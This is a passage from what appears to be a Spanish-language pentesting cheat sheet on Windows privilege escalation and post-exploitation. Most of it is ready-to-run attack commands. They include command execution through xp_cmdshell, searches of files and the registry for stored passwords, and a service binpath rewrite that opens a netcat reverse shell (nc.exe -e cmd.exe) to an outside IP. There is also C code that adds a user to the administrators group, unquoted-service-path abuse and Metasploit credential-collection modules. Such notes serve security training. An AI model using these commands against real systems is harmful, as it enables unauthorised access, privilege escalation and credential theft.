<span class="m">6</span>&gt;<span class="w"> </span>go
<span class="m">7</span>&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
<span class="m">8</span>&gt;<span class="w"> </span>go

nt<span class="w"> </span>authority<span class="se">\ </span>system
</code></pre></div>

<p>Y ya lograremos ejecutar comandos sobre el sistema.</p>
<h4 id="mssqlclient-impacket">mssqlclient Impacket<a class="headerlink" href="#mssqlclient-impacket" title="Permanent link">&para;</a></h4>
<p>El recurso lo podemos obtener <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">aquí</a>, y su uso es similar al de <strong>psexec</strong>. En mi caso, lo uso cuando han cambiado el puerto por defecto:</p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>mssqlclient.py<span class="w"> </span>WORKGROUP/Administrator:password@192.168.1X<span class="w"> </span>-port<span class="w"> </span><span class="m">46758</span>
</code></pre></div>

<p>Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.</p>
<h4 id="reconocimiento-del-sistema">Reconocimiento del Sistema<a class="headerlink" href="#reconocimiento-del-sistema" title="Permanent link">&para;</a></h4>
<p>Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeración manual, redireccionando todo a un fichero de reportes:</p>
<div class="codehilite"><pre><span></span><code><span class="w"> </span>@echo<span class="w"> </span>---------<span class="w"> </span>BASIC<span class="w"> </span>WINDOWS<span class="w"> </span>RECON<span class="w"> </span>---------<span class="w">  </span>&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>net<span class="w"> </span>config<span class="w"> </span>Workstation<span class="w">  </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>systeminfo<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>/B<span class="w"> </span>/C:<span class="s2">&quot;OS Name&quot;</span><span class="w"> </span>/C:<span class="s2">&quot;OS Version&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>hostname<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>net<span class="w"> </span>users<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>ipconfig<span class="w"> </span>/all<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>route<span class="w"> </span>print<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>arp<span class="w"> </span>-A<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>netstat<span class="w"> </span>-ano<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>netsh<span class="w"> </span>firewall<span class="w"> </span>show<span class="w"> </span>state<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>netsh<span class="w"> </span>firewall<span class="w"> </span>show<span class="w"> </span>config<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>schtasks<span class="w"> </span>/query<span class="w"> </span>/fo<span class="w"> </span>LIST<span class="w"> </span>/v<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>tasklist<span class="w"> </span>/SVC<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>net<span class="w"> </span>start<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>DRIVERQUERY<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller<span class="se">\A</span>lwaysInstallElevated<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller<span class="se">\A</span>lwaysInstallElevated<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>dir<span class="w"> </span>/s<span class="w"> </span>*pass*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*cred*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*vnc*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*.config*<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.xml<span class="w"> </span>*.ini<span class="w"> </span>*.txt<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s<span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>dir<span class="w"> </span><span class="s2">&quot;C:\&quot;</span>
<span class="s2"> timeout 1</span>
<span class="s2"> dir &quot;</span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>report.txt
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>dir<span class="w"> </span><span class="s2">&quot;C:\Program Files (x86)\&quot;</span>
<span class="s2"> timeout 1</span>
<span class="s2"> dir &quot;</span>C:<span class="se">\U</span>sers<span class="se">\&quot;</span>
<span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span>
<span class="w"> </span>dir<span class="w"> </span><span class="s2">&quot;C:\Users\Public\&quot;</span>
<span class="s2"> timeout 1</span>
<span class="s2"> echo REPORT COMPLETE!</span>
</code></pre></div>

<p>A su vez, podemos hacer del recurso <a href="https://github.com/ankh2054/windows-pentest/blob/master/wmic-info">wmic-info</a> a fin de obtener información acerca del sistema.</p>
<p>Otra opción, es utilizar <a href="https://github.com/ankh2054/windows-pentest/blob/master/icacls.bat">icacls.bat</a>, para la enumeración de permisos débiles a nivel de sistema.</p>
<p>Una buena herramienta a utilizar para la enumeración de permisos débiles asignados sobre archivos que son ejecutados a través de tareas en intervalos regulares de tiempo es <a href="https://github.com/ankh2054/windows-pentest/blob/master/schcheck.bat">schcheck.bat</a></p>
<p>A continuación, se detallan algunos usos de <em>accesschk.exe</em>, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.</p>
<div class="codehilite"><pre><span></span><code>accesschk<span class="w"> </span><span class="s2">&quot;power users&quot;</span><span class="w"> </span>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32
accesschk<span class="w"> </span>users<span class="w"> </span>-cw<span class="w"> </span>*
accesschk.exe<span class="w"> </span>-uwcqv<span class="w"> </span><span class="s2">&quot;Authenticated Users&quot;</span><span class="w"> </span>*
accesschk.exe<span class="w"> </span>-uwcqv<span class="w"> </span>adam.dale<span class="w"> </span>*
accesschk.exe<span class="w"> </span>-ucqv<span class="w"> </span>NetLogon
accesschk.exe<span class="w"> </span>-uwdqs<span class="w"> </span>Users<span class="w"> </span>c:<span class="se">\</span>
accesschk.exe<span class="w"> </span>-uwdqs<span class="w"> </span><span class="s2">&quot;Authenticated Users&quot;</span><span class="w"> </span>c:
accesschk.exe<span class="w"> </span>-uwqs<span class="w"> </span>Users<span class="w"> </span>c:<span class="se">\*</span>.*
accesschk.exe<span class="w"> </span>-uwqs<span class="w"> </span><span class="s2">&quot;Authenticated Users&quot;</span><span class="w"> </span>c:<span class="se">\*</span>.*
accesschk<span class="w"> </span>-kns<span class="w"> </span>austin<span class="se">\m</span>russ<span class="w"> </span>hklm<span class="se">\s</span>oftware
accesschk<span class="w"> </span>-k<span class="w"> </span>hklm<span class="se">\s</span>oftware
accesschk<span class="w"> </span>-e<span class="w"> </span>-s<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\m</span>ark
accesschk<span class="w"> </span>-wuo<span class="w"> </span>everyone<span class="w"> </span><span class="se">\b</span>asednamedobjects
</code></pre></div>

<h4 id="kernel-exploits-windows">Kernel Exploits Windows<a class="headerlink" href="#kernel-exploits-windows" title="Permanent link">&para;</a></h4>
<p>A continuación, se enumeran distintos exploits de Kernel interesantes a usar que en más de una ocasión han funcionado en las máquinas del lab. Así mismo es recomendable llevarlos siempre bajo la manga:</p>
<ul>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070">MS14-070</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012">MS09-012</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046">MS11-046</a></li>
</ul>
<h4 id="privilege-escalation-enumerations">Privilege Escalation Enumerations<a class="headerlink" href="#privilege-escalation-enumerations" title="Permanent link">&para;</a></h4>
<p>A continuación, se detalla una enumeración básica del sistema.</p>
<p><strong>Información Básica</strong></p>
<div class="codehilite"><pre><span></span><code>systeminfo
hostname
</code></pre></div>

<p><strong>¿Quiénes somos?</strong></p>
<div class="codehilite"><pre><span></span><code>whoami
<span class="nb">echo</span><span class="w"> </span>%username%
</code></pre></div>

<p><strong>¿Qué usuarios y grupos locales existen en el sistema?</strong></p>
<div class="codehilite"><pre><span></span><code>net<span class="w"> </span>users
net<span class="w"> </span>localgroups
</code></pre></div>

<p><strong>Enumerar información de usuario, interesante para ver si el usuario posee privilegios</strong></p>
<div class="codehilite"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>usuario
</code></pre></div>

<p><strong>Ver grupos de Dominio</strong></p>
<div class="codehilite"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>/domain
</code></pre></div>

<p><strong>Ver miembros del Domain Group</strong></p>
<div class="codehilite"><pre><span></span><code>net<span class="w"> </span>group<span class="w"> </span>/domain<span class="w"> </span>&lt;Group<span class="w"> </span>Name&gt;
</code></pre></div>

<p><strong>Firewall</strong></p>
<div class="codehilite"><pre><span></span><code>netsh<span class="w"> </span>firewall<span class="w"> </span>show<span class="w"> </span>state
netsh<span class="w"> </span>firewall<span class="w"> </span>show<span class="w"> </span>config
</code></pre></div>

<p><strong>Network</strong></p>
<div class="codehilite"><pre><span></span><code>ipconfig<span class="w"> </span>/all
route<span class="w"> </span>print
arp<span class="w"> </span>-A
</code></pre></div>

<p><strong>¿Cómo de bien está parcheado el sistema?</strong></p>
<div class="codehilite"><pre><span></span><code>wmic<span class="w"> </span>qfe<span class="w"> </span>get<span class="w"> </span>Caption,Description,HotFixID,InstalledOn
</code></pre></div>

<p><strong>Búsqueda de Contraseñas en Texto Claro sobre el Sistema</strong></p>
<div class="codehilite"><pre><span></span><code>findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.txt
findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.xml
findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.ini

dir<span class="w"> </span>/s<span class="w"> </span>*pass*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*cred*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*vnc*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*.config*

findstr<span class="w"> </span>/spin<span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="w"> </span>*.*
findstr<span class="w"> </span>/spin<span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="w"> </span>*.*
</code></pre></div>

<p><strong>Búsqueda de Contraseñas en Texto Claro sobre Archivos</strong></p>
<p>Es probable que nos las encontremos en Base64:</p>
<div class="codehilite"><pre><span></span><code>c:<span class="se">\s</span>ysprep.inf
c:<span class="se">\s</span>ysprep<span class="se">\s</span>ysprep.xml
c:<span class="se">\u</span>nattend.xml
%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattend<span class="se">\U</span>nattended.xml
%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattended.xml

dir<span class="w"> </span>c:<span class="se">\*</span>vnc.ini<span class="w"> </span>/s<span class="w"> </span>/b
dir<span class="w"> </span>c:<span class="se">\*</span>ultravnc.ini<span class="w"> </span>/s<span class="w"> </span>/b<span class="w"> </span>
dir<span class="w"> </span>c:<span class="se">\ </span>/s<span class="w"> </span>/b<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>/si<span class="w"> </span>*vnc.ini
</code></pre></div>

<p><strong>Búsqueda de Contraseñas en Texto Claro Almacenadas en Registro</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># VNC</span>
reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>

<span class="c1"># Windows autologin</span>
reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>

<span class="c1"># SNMP Paramters</span>
reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span>

<span class="c1"># Putty</span>
reg<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span>

<span class="c1"># Búsqueda de Contraseñas almacenadas en Registro</span>
reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
</code></pre></div>

<p><strong>Scheduled Tasks</strong></p>
<div class="codehilite"><pre><span></span><code>schtasks<span class="w"> </span>/query<span class="w"> </span>/fo<span class="w"> </span>LIST<span class="w"> </span>/v<span class="w"> </span>&gt;<span class="w"> </span>schtasks.txt
cat<span class="w"> </span>schtask.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;SYSTEM\|Task To Run&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-B<span class="w"> </span><span class="m">1</span><span class="w"> </span>SYSTEM
</code></pre></div>

<p><strong>Cambio de binario para el servicio upnp</strong></p>
<div class="codehilite"><pre><span></span><code>sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;C:\Inetpub\nc.exe 192.168.1.X 6666 -e c:\Windows\system32\cmd.exe&quot;</span>
sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">obj</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;.\LocalSystem&quot;</span><span class="w"> </span><span class="nv">password</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
sc<span class="w"> </span>config<span class="w"> </span>upnphost<span class="w"> </span><span class="nv">depend</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
</code></pre></div>

<p><strong>Búsqueda de Permisos Débiles</strong></p>
<div class="codehilite"><pre><span></span><code>wmic<span class="w"> </span>service<span class="w"> </span>list<span class="w"> </span>brief

<span class="c1"># El comando anterior generará montón de contenido, por lo tanto, una buena práctica es parsear los resultados. Lo hacemos en los siguiente pasos.</span>

<span class="k">for</span><span class="w"> </span>/f<span class="w"> </span><span class="s2">&quot;tokens=2 delims=&#39;=&#39;&quot;</span><span class="w"> </span>%a<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="s1">&#39;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&#39;</span><span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>@echo<span class="w"> </span>%a<span class="w"> </span>&gt;&gt;<span class="w"> </span>c:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\p</span>ermissions.txt

<span class="k">for</span><span class="w"> </span>/f<span class="w"> </span>eol^<span class="o">=</span>^<span class="s2">&quot;^ delims^=^&quot;</span><span class="w"> </span>%a<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span>c:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\p</span>ermissions.txt<span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>cmd.exe<span class="w"> </span>/c<span class="w"> </span>icacls<span class="w"> </span><span class="s2">&quot;%a&quot;</span>

sc<span class="w"> </span>query<span class="w"> </span><span class="nv">state</span><span class="o">=</span><span class="w"> </span>all<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span><span class="s2">&quot;SERVICE_NAME:&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>Servicenames.txt

FOR<span class="w"> </span>/F<span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span>Servicenames.txt<span class="o">)</span><span class="w"> </span>DO<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>%i
<span class="nb">type</span><span class="w"> </span>Servicenames.txt

FOR<span class="w"> </span>/F<span class="w"> </span><span class="s2">&quot;tokens=2 delims= &quot;</span><span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span>Servicenames.txt<span class="o">)</span><span class="w"> </span>DO<span class="w"> </span>@echo<span class="w"> </span>%i<span class="w"> </span>&gt;&gt;<span class="w"> </span>services.txt

FOR<span class="w"> </span>/F<span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span>services.txt<span class="o">)</span><span class="w"> </span>DO<span class="w"> </span>@sc<span class="w"> </span>qc<span class="w"> </span>%i<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span><span class="s2">&quot;BINARY_PATH_NAME&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>path.txt

<span class="c1"># Procesamos a continuación cada uno de los resultados obtenidos vía cacls</span>

cacls<span class="w"> </span><span class="s2">&quot;C:\path\to\file.exe&quot;</span>
</code></pre></div>

<p>En este paso siempre vamos a estar interesados en el Output <em>BUILTIN\Users:(F)</em>, o que nuestro usuario cuente con los permisos <em>(F)</em> o <em>(C)</em>:</p>
<div class="codehilite"><pre><span></span><code>C:<span class="se">\p</span>ath<span class="se">\t</span>o<span class="se">\f</span>ile.exe<span class="w"> </span>
BUILTIN<span class="se">\U</span>sers:F
BUILTIN<span class="se">\P</span>ower<span class="w"> </span>Users:C<span class="w"> </span>
BUILTIN<span class="se">\A</span>dministrators:F<span class="w"> </span>
NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM:F
</code></pre></div>

<p>Esto querá decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiéndonos de esta forma incrustrar un ejecutable malicioso. </p>
<p>A continuación, se representa un ejemplo de código en C para un simple <strong>getsuid</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="c1">#include &lt;stdlib.h&gt;</span>
int<span class="w"> </span>main<span class="w"> </span><span class="o">()</span>
<span class="o">{</span>
int<span class="w"> </span>i<span class="p">;</span>
<span class="w">    </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>system<span class="o">(</span><span class="s2">&quot;net localgroup administrators theusername /add&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>

<p>Compilamos el mismo haciendo uso de la siguiente sintáxis:</p>
<div class="codehilite"><pre><span></span><code>i686-w64-mingw32-gcc<span class="w"> </span>windows-exp.c<span class="w"> </span>-lws2_32<span class="w"> </span>-o<span class="w"> </span>exp.exe
</code></pre></div>

<p>Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vía <strong>wmic</strong> o <strong>net</strong>, de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>wmic<span class="w"> </span>service<span class="w"> </span>NAMEOFSERVICE<span class="w"> </span>call<span class="w"> </span>startservice

net<span class="w"> </span>stop<span class="w"> </span><span class="o">[</span>service<span class="w"> </span>name<span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>net<span class="w"> </span>start<span class="w"> </span><span class="o">[</span>service<span class="w"> </span>name<span class="o">]</span>.
</code></pre></div>

<p><strong>Unquoted Service Paths</strong></p>
<p>Esta técnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Usando WMIC</span>
wmic<span class="w"> </span>service<span class="w"> </span>get<span class="w"> </span>name,displayname,pathname,startmode<span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span><span class="s2">&quot;auto&quot;</span><span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span>/v<span class="w"> </span><span class="s2">&quot;c:\windows\\&quot;</span><span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span>/v<span class="w"> </span><span class="s2">&quot;&quot;&quot;</span>

<span class="s2"># Usando sc</span>
<span class="s2">sc query</span>
<span class="s2">sc qc service name</span>
</code></pre></div>

<p>Si la ruta de alguno de los servicios listados contienen un espacio y no están doblemente encomillados, el servicio es vulnerable.</p>
<p>Suponiendo que la ruta fuera esta a modo de ejemplo:</p>
<div class="codehilite"><pre><span></span><code>c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\s</span>omething<span class="se">\w</span>inamp.exe
</code></pre></div>

<p>Podríamos depositar un binario tal que así:</p>
<div class="codehilite"><pre><span></span><code>c:<span class="se">\p</span>rogram.exe
</code></pre></div>

<p>Tras reiniciar el servicio, lo que sucederá es que tomará como binario a ejecutar el situado en <strong>c:\program.exe</strong> en vez del que debería, permitiendo así llevar a cabo una ejecución con posibilidad de alto privilegio sobre el mismo.</p>
<p><strong>Módulos interesantes de Post-Explotación desde Metasploit</strong></p>
<div class="codehilite"><pre><span></span><code>use<span class="w"> </span>exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run<span class="w"> </span>post/windows/gather/credential_collector<span class="w"> </span>

run<span class="w"> </span>post/multi/recon/local_exploit_suggester

run<span class="w"> </span>post/windows/gather/enum_shares

run<span class="w"> </span>post/windows/gather/enum_snmp

run<span class="w"> </span>post/windows/gather/enum_applications

run<span class="w"> </span>post/windows/gather/enum_logged_on_users

run<span class="w"> </span>post/windows/gather/checkvm
</code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2016 - 2023 Insane Rask
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.action.edit", "content.action.view", "content.tooltips", "navigation.sections"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.a7c05c9e.min.js"></script>
      
    
  </body>
</html>